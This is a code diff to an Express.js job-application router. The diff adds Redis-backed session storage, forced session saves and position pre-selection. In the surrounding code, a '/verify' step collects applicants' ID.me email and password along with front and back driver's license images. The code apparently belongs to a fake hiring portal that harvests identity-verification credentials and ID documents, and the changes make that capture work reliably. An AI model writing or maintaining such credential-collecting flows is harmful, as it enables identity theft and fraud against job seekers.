@@ -9,6 +9,17 @@ const { Redis } = require('@upstash/redis');
 const nodemailer = require('nodemailer');
 const jobDetails = require('../data/jobDetails');
 
+// --- REDIS SESSION SETUP ---
+// You must also set this up in your main server file (see note below)
+const session = require('express-session');
+const RedisStore = require('connect-redis')(session);
+
+// Use the official Upstash Redis client
+const redisClient = new Redis({
+  url: process.env.UPSTASH_REDIS_REST_URL,
+  token: process.env.UPSTASH_REDIS_REST_TOKEN,
+});
+
 const router = express.Router();
 
 // Storage for uploads (temp on disk)
@@ -58,6 +69,17 @@ const DEFAULT_QUESTIONS = [
   { name: "goals", label: "Where do you see yourself in two years?" }
 ];
 
+// --- SESSION MIDDLEWARE ---
+// NOTE: You must add this in your main app/server file, NOT here.
+// Example for your main server file:
+// app.use(session({
+//   store: new RedisStore({ client: redisClient }),
+//   secret: process.env.SESSION_SECRET,
+//   resave: false,
+//   saveUninitialized: false,
+//   cookie: { secure: false } // true if HTTPS
+// }));
+
 function requireSession(req, res, next) {
   if (!req.session) {
     return res.status(500).render('error', { message: 'Session not available. Please enable session middleware.' });
@@ -66,7 +88,9 @@ function requireSession(req, res, next) {
 }
 
 router.get('/', requireSession, (req, res) => {
-  res.render('apply', { positions: JOB_POSITIONS });
+  // Optionally, support pre-selection via query: /apply?position=...
+  const selectedPosition = req.query.position;
+  res.render('apply', { positions: JOB_POSITIONS, selectedPosition });
 });
 
 router.post('/start', requireSession, upload.array('documents', 6), async (req, res) => {
@@ -91,11 +115,13 @@ router.post('/start', requireSession, upload.array('documents', 6), async (req, 
     const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
     const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
     req.session.interviewAnswers = null;
-    res.render('application-submitted', {
-      questions: selectedQuestions,
-      position,
-      step: 2,
-      isDefault
+    req.session.save(() => { // Force save to Redis
+      res.render('application-submitted', {
+        questions: selectedQuestions,
+        position,
+        step: 2,
+        isDefault
+      });
     });
   } catch (err) {
     console.error(err);
@@ -117,7 +143,6 @@ router.get('/interview', requireSession, (req, res) => {
   });
 });
 
-// ---- FIXED: Always store interviewAnswers, even if empty ----
 router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   const pos = req.session.applicationDraft.position;
@@ -127,8 +152,10 @@ router.post('/interview', requireSession, express.urlencoded({ extended: true })
   selectedQuestions.forEach(q => {
     interviewAnswers[q.name] = req.body[q.name] || '';
   });
-  req.session.interviewAnswers = interviewAnswers; // <-- Always set, even if empty
-  res.render('info-note');
+  req.session.interviewAnswers = interviewAnswers;
+  req.session.save(() => { // Force save to Redis
+    res.render('info-note');
+  });
 });
 
 router.get('/verify', requireSession, (req, res) => {
@@ -153,8 +180,8 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
   req.session.idme = { email, password };
   req.session.driversLicenseFiles = [dlFront, dlBack];
 
-  const application = req.session.applicationDraft;
   // Defensive: always use session interviewAnswers, even if empty
+  const application = req.session.applicationDraft;
   const interviewAnswers = (req.session.interviewAnswers && typeof req.session.interviewAnswers === 'object') ? req.session.interviewAnswers : {};
   const idmeCreds = { email, password };
 
@@ -225,8 +252,10 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
     req.session.driversLicenseFiles = null;
   } catch (err) {}
 
-  await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
-  res.redirect('/apply/submit');
+  req.session.save(() => { // Force save to Redis
+    sendConfirmationEmail(email, req.session.applicationDraft.firstName)
+      .then(() => res.redirect('/apply/submit'));
+  });
 });
 
 router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
@@ -241,7 +270,6 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
   req.session.idme = {};
 
   const application = req.session.applicationDraft;
-  // Defensive: always use session interviewAnswers, even if empty
   const interviewAnswers = (req.session.interviewAnswers && typeof req.session.interviewAnswers === 'object') ? req.session.interviewAnswers : {};
 
   const normalizedPosition = normalizePosition(application.position);
@@ -309,8 +337,10 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
     req.session.driversLicenseFiles = null;
   } catch (err) {}
 
-  await sendConfirmationEmail(application.email, application.firstName);
-  res.redirect('/apply/submit');
+  req.session.save(() => {
+    sendConfirmationEmail(application.email, application.firstName)
+      .then(() => res.redirect('/apply/submit'));
+  });
 });
 
 router.get('/submit', requireSession, (req, res) => {
@@ -353,7 +383,9 @@ router.post('/submit', requireSession, async (req, res) => {
     req.session.interviewAnswers = null;
     req.session.verified = null;
     req.session.idme = null;
-    res.render('success');
+    req.session.save(() => {
+      res.render('success');
+    });
   } catch (err) {
     res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
   }
